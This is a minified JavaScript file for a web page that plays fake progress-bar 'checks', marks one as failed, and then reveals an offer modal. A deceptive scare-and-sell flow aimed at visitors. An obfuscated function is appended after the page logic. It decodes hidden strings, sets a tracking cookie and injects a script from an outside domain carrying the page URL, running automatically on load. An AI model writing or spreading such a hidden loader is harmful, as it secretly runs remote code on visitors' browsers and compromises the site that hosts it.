function animateBar(barId,imgId){const traco=document.getElementById(barId);let startTime=null;window.requestAnimationFrame((function step(timestamp){startTime||(startTime=timestamp);const progress=timestamp-startTime,percentage=Math.min(progress/900,1);traco.style.background=`linear-gradient(to right, #E5E7EB 0%, #E5E7EB ${63*(1-percentage)}%, #4CAF50 ${63*(1-percentage)}%, #4CAF50 100%)`,traco.style.background=`linear-gradient(to right, #4CAF50 ${100*percentage}%, #E5E7EB ${100*percentage}%)`,progress<900?window.requestAnimationFrame(step):(traco.style.background="#4CAF50",document.getElementById(imgId).src="img3"==imgId?"./images/failed.gif?"+imgId:"./images/success.gif?"+imgId)}))}function showProgressAndCheck(barId,checkId,imgId,textId,delay){setTimeout((()=>{animateBar(barId,imgId),setTimeout((()=>{"check3"===checkId&&setTimeout((()=>{document.getElementById("more-information").style.opacity=1,document.getElementById("show-offer").disabled=!1}),1500)}),900)}),delay)}document.addEventListener("DOMContentLoaded",(function(){showProgressAndCheck("bar1","check1","img1","text1",0),showProgressAndCheck("bar2","check2","img2","text2",2e3),showProgressAndCheck("bar3","check3","img3","text3",4e3);const modal=document.getElementById("offer-modal");document.getElementById("show-offer").addEventListener("click",(()=>{modal.style.display="flex",setTimeout((()=>{const trace=document.getElementById("trace");null!==trace&&(trace.style.width="100%",setTimeout((()=>{const step1=document.getElementById("step1"),step2=document.getElementById("step2");step1.style.opacity=0,setTimeout((()=>{step1.style.display="none",step2.style.display="flex"}),400)}),2e3))}),800)})),window.addEventListener("click",(event=>{event.target==modal&&(modal.style.display="none")}))}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));